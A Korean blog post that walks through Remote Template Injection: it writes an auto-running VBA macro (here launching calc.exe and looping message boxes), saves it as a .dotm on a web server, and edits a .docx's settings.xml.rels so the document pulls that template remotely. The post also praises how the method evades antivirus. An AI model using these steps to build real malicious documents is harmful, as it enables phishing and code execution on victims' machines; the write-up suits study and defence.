# Remote Template Injection

출처: https://nameng.tistory.com/146

친구 블로그를 보다가 재밌고 간단해보여서 바로 해봤다.

 

중국 문서형 악성코드에서 자주쓰이는 공격기법이라한다.

워드안에 있는 템플릿을 이용한 기법으로 악성코드를 안전하게 퍼트릴수있다고 한다.

 



![img](https://blog.kakaocdn.net/dn/YfaMX/btrssBZRh00/wJLGxBkjUydbZ0uICK3SQ0/img.png)



템플릿을 구성하는 부분 중 템플릿설정 매크로 등이 담겨있는 .dotm파일을 이용한다.

우선 사진의 템플릿중 원하는걸 골라 만들어준다.



![img](https://blog.kakaocdn.net/dn/9UDT9/btrskFhINZv/vzc3UCMYgHg97J6oB2DHyk/img.png)



만든 후 새로 빈 워드를 또 만들어 준 후 매크로 기능을 열어서 macros in 을 사진처럼 골라주고 create를 해준다.

 



![img](https://blog.kakaocdn.net/dn/bjWagT/btrsi947prp/ohHlkvKKRB0uT6PKEShD9K/img.png)



```
Sub AutoOpen()
    a
End Sub

Sub Document_Open()
    a
End Sub

Sub a()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run ("calc.exe")
    For i = 0 To 20
         MsgBox "내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈내돈", Buttons:=vbCritical
    Next i
End Sub
```

만들면 왼쪽 프로젝트 창에 thisdocument를 클릭해 소스를 넣어주고 .dotm파일로 저장해준다.

파일 저장이 어디로 됐는지 모르겠으면 해당경로에서 찾아준다.

C:\Users\USER\Documents\Custom Office Templates

 

'''

(내돈내돈내돈내돈) 하는이유



![img](https://blog.kakaocdn.net/dn/bqf3wF/btrr9zCUBso/FSpOoFIE7sE45bXm9LNRv1/img.png)



코스피가 파국이였기때문 ㅎ;

'''

 

만들어준.dotm 파일을 웹서버에 올려 해당링크에 접속하면 누구나 다운로드가 가능하도록 해준다.

그다음 처음 만들어준 docx파일을 .zip으로 확장자를 바꾸고 압축을 풀어준다.

docx이름\word\_rels\settings.xml.rels만 수정하면된다.

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\USER\AppData\Local\Microsoft\Office\16.0\DTS\en-US%7bB9897217-BC5B-4439-8249-2E4D3B35A30B%7d\%7b129B30C0-C51A-4B62-8A9E-8157040A17DB%7dtf45325165_win32.dotx" TargetMode="External"/>
</Relationships>
```

파일을 열면 다음처럼 나오는데 Target부분만 우리가 .dotm파일을 올린 링크로 바꾸면된다.

```
Target=".dotm파일 올린 링크"
```

수정한 부분을 저장해주고 다시 압축을한후 .zip확장자를 .docx로 바꿔주면된다.



![img](https://blog.kakaocdn.net/dn/bimOll/btrslU0KuCS/QI5kidkeLMaZBw0BTu1Un0/img.png)



해당파일을 실행하면 매크로가 꺼져있다는데 실행하기를 누르면 아까만든 스크립트가 실행된다.



![img](https://blog.kakaocdn.net/dn/0yNeN/btrsrQirHcB/LJ7siRwSNDH1klYxbRWKfk/img.png)



실행된 모습

 

이공격기법에 장점으로는 공격하는 코드가 문서내에 포함되어 있지 않기에 백신등에서 탐지하기 어렵고 이 기법은 문서실행마다 .dotm파일을 올려둔 서버에 접근하는것을 이용하기에 공격자 입장에서 그만두고 싶을때 서버의 파일을 삭제함으로써 손절을 잘할수있다.

 

 

 

 

출처-

https://goseungduk.tistory.com/111?category=879438 